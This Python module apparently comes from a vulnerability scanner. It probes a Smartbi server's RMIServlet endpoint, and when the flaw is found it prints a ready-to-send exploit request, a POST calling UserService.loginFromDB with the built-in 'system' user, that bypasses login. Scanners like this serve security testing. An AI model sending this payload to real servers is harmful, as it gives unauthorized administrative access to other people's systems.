import requests
import time
from bs4 import BeautifulSoup
import logging
import re

uj=''
http = ''
https = ''
def a2dl1(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global uj
    global http,https
    try:
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        aa = requests.get(url1+'smartbi/vision/RMIServlet',cookies=s_cookie,proxies=proxies,verify=False, timeout=5)
        aa.encoding = 'utf-8'
        cd = BeautifulSoup(aa.text, 'html.parser')
        if 'CLIENT_USER_NOT_LOGIN' in cd.text or '{"retCode":' in cd.text:
            uj='[+]漏洞存在\nPOST /smartbi/vision/RMIServlet HTTP/1.1\nHost: your-ip\nContent-Type: application/x-www-form-urlencoded\n\nclassName=UserService&methodName=loginFromDB&params=["system","0a"]\n'+cd.text
        else:
            uj='[-]漏洞不存在'
    except Exception as aaa:
        uj='[-]请求错误\n'+str(aaa)
def a2jg8():
    global uj
    return '--------------------------------------------------\n[ Smartbi内置用户登陆绕过漏洞 ]\n\n'+ str (uj)+'\n'
def a2u8(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)
